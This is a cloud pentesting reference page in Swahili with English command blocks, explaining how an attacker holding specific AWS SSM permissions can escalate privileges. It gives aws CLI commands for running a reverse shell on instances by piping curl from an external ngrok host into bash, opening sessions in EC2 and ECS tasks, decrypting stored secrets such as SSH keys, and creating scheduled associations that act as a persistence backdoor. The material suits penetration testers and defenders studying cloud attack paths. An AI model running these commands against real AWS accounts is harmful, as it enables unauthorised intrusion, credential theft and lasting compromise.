# AWS - SSM Privesc

{{#include ../../../banners/hacktricks-training.md}}

## SSM

Kwa maelezo zaidi kuhusu SSM angalia:

{{#ref}}
../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### `ssm:SendCommand`

Mshambuliaji mwenye ruhusa **`ssm:SendCommand`** anaweza **kutekeleza amri katika mifano** inayotumia Amazon SSM Agent na **kuathiri IAM Role** inayotumia ndani yake.
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/4.tcp.ngrok.io:16084 | bash"
```
Ikiwa unatumia mbinu hii kuongeza mamlaka ndani ya EC2 instance ambayo tayari imeathiriwa, unaweza tu kukamata rev shell kwa ndani kwa:
```bash
# If you are in the machine you can capture the reverseshel inside of it
nc -lvnp 4444 #Inside the EC2 instance
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/127.0.0.1:4444 | bash"
```
**Madhara Yanayoweza Kutokea:** Privesc moja kwa moja kwa EC2 IAM roles zilizounganishwa na mifano inayoendesha SSM Agents.

### `ssm:StartSession`

Mshambuliaji mwenye ruhusa **`ssm:StartSession`** anaweza **kuanzisha kikao kama cha SSH katika mifano** inayokimbia Amazon SSM Agent na **kushambulia IAM Role** inayokimbia ndani yake.
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm start-session --target "$INSTANCE_ID"
```
> [!CAUTION]
> Ili kuanzisha kikao unahitaji **SessionManagerPlugin** iliyosakinishwa: [https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html)

**Athari Zinazoweza Kutokea:** Privesc moja kwa moja kwa EC2 IAM roles zilizounganishwa na mifano inayotembea yenye SSM Agents inayoendesha.

#### Privesc kwa ECS

Wakati **ECS tasks** zinapokimbia na **`ExecuteCommand` imewezeshwa** watumiaji wenye ruhusa za kutosha wanaweza kutumia `ecs execute-command` ili **kutekeleza amri** ndani ya kontena.\
Kulingana na [**nyaraka**](https://aws.amazon.com/blogs/containers/new-using-amazon-ecs-exec-access-your-containers-fargate-ec2/) hii inafanywa kwa kuunda channel salama kati ya kifaa unachotumia kuanzisha amri ya “_exec_“ na kontena lengwa na SSM Session Manager. (SSM Session Manager Plugin inahitajika ili hii ifanye kazi)\
Hivyo, watumiaji wenye `ssm:StartSession` wataweza **kupata shell ndani ya ECS tasks** ikiwa chaguo hicho kimewezeshwa kwa kukimbia tu:
```bash
aws ssm start-session --target "ecs:CLUSTERNAME_TASKID_RUNTIMEID"
```
![](<../../../images/image (185).png>)

**Madhara Yanayoweza Kutokea:** Privesc moja kwa moja kwa `ECS`IAM roles zilizounganishwa na kazi zinazotekelezwa zikiwa na `ExecuteCommand` imewezeshwa.

### `ssm:ResumeSession`

Mshambuliaji mwenye ruhusa **`ssm:ResumeSession`** anaweza ku-**anzisha tena kikao kama cha SSH katika mifano** inayotumia Amazon SSM Agent ikiwa na hali ya kikao cha SSM **kilichounganishwa** na **kuathiri IAM Role** inayotekelezwa ndani yake.
```bash
# Check for configured instances
aws ssm describe-sessions

# Get resume data (you will probably need to do something else with this info to connect)
aws ssm resume-session \
--session-id Mary-Major-07a16060613c408b5
```
**Madhara Yanayoweza Kutokea:** Privesc moja kwa moja kwa EC2 IAM roles zilizounganishwa na mifano inayotembea yenye SSM Agents zinazotembea na vikao vilivyounganishwa.

### `ssm:DescribeParameters`, (`ssm:GetParameter` | `ssm:GetParameters`)

Mshambuliaji mwenye ruhusa zilizoelezwa atakuwa na uwezo wa kuorodhesha **SSM parameters** na **kuvisoma kwa maandiko wazi**. Katika vigezo hivi unaweza mara nyingi **kupata taarifa nyeti** kama funguo za SSH au funguo za API.
```bash
aws ssm describe-parameters
# Suppose that you found a parameter called "id_rsa"
aws ssm get-parameters --names id_rsa --with-decryption
aws ssm get-parameter --name id_rsa --with-decryption
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya vigezo.

### `ssm:ListCommands`

Mshambuliaji mwenye ruhusa hii anaweza kuorodhesha **amri** zote zilizotumwa na kwa matumaini kupata **taarifa nyeti** ndani yao.
```
aws ssm list-commands
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya mistari ya amri.

### `ssm:GetCommandInvocation`, (`ssm:ListCommandInvocations` | `ssm:ListCommands`)

Mshambuliaji mwenye ruhusa hizi anaweza orodhesha **amri** zote zilizotumwa na **kusoma matokeo** yaliyotolewa akitumaini kupata **taarifa nyeti** ndani yake.
```bash
# You can use any of both options to get the command-id and instance id
aws ssm list-commands
aws ssm list-command-invocations

aws ssm get-command-invocation --command-id <cmd_id> --instance-id <i_id>
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya matokeo ya amri za mistari.

### Kutumia ssm:CreateAssociation

Mshambuliaji mwenye ruhusa **`ssm:CreateAssociation`** anaweza kuunda Muungano wa Meneja wa Jimbo ili kutekeleza amri kiotomatiki kwenye mifano ya EC2 inayosimamiwa na SSM. Muungano huu unaweza kuwekwa ili ufanye kazi kwa muda maalum, na kuufanya kuwa mzuri kwa kudumu kama mlango wa nyuma bila vikao vya mwingiliano.
```bash
aws ssm create-association \
--name SSM-Document-Name \
--targets Key=InstanceIds,Values=target-instance-id \
--parameters commands=["malicious-command"] \
--schedule-expression "rate(30 minutes)" \
--association-name association-name
```
> [!NOTE]
> Njia hii ya kudumu inafanya kazi mradi tu EC2 instance inasimamiwa na Systems Manager, SSM agent inafanya kazi, na mshambuliaji ana ruhusa ya kuunda ushirikiano. Haihitaji vikao vya mwingiliano au ruhusa za wazi za ssm:SendCommand. **Muhimu:** Parameta ya `--schedule-expression` (mfano, `rate(30 minutes)`) inapaswa kuheshimu kiwango cha chini cha AWS cha dakika 30. Kwa utekelezaji wa haraka au wa mara moja, acha kabisa `--schedule-expression` — ushirikiano utafanyika mara moja baada ya kuundwa.

### Codebuild

Unaweza pia kutumia SSM kuingia ndani ya mradi wa codebuild unaojengwa:

{{#ref}}
aws-codebuild-privesc.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
